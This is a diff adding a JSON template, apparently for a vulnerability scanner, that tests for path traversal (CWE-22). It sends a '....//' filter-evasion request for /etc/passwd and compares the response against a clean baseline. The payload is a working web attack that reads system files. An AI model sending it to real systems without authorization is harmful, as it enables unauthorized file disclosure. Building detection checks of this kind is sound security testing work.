@@ -1,0 +1,41 @@
+{
+  "name": "web/Path traversal once-strip filter evasion",
+  "description": "[basic] Path traversal with once-strip filter evasion (CWE-22; PayloadsAllTheThings Directory Traversal + PortSwigger): '....//' collapses back to '../' when the sanitizer strips the sequence exactly once — file read proves it. Keywords: path traversal lfi dot-dot filter evasion download file read passwd. ctrl: clean baseline fetch must stay normal (no passwd shape) -> not falsified. base_url = file-echo endpoint root; copy skill for %2e%2e%2f and double-encoding variants.",
+  "cwe": "CWE-22",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/download?file=....//....//....//etc/passwd"
+    },
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/download?file=report.pdf"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "root:[a-z*]{1,12}:0:0"
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "baseline",
+      "pattern": "root:[a-z*]{1,12}:0:0",
+      "present": false
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "2684a2e884c2",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
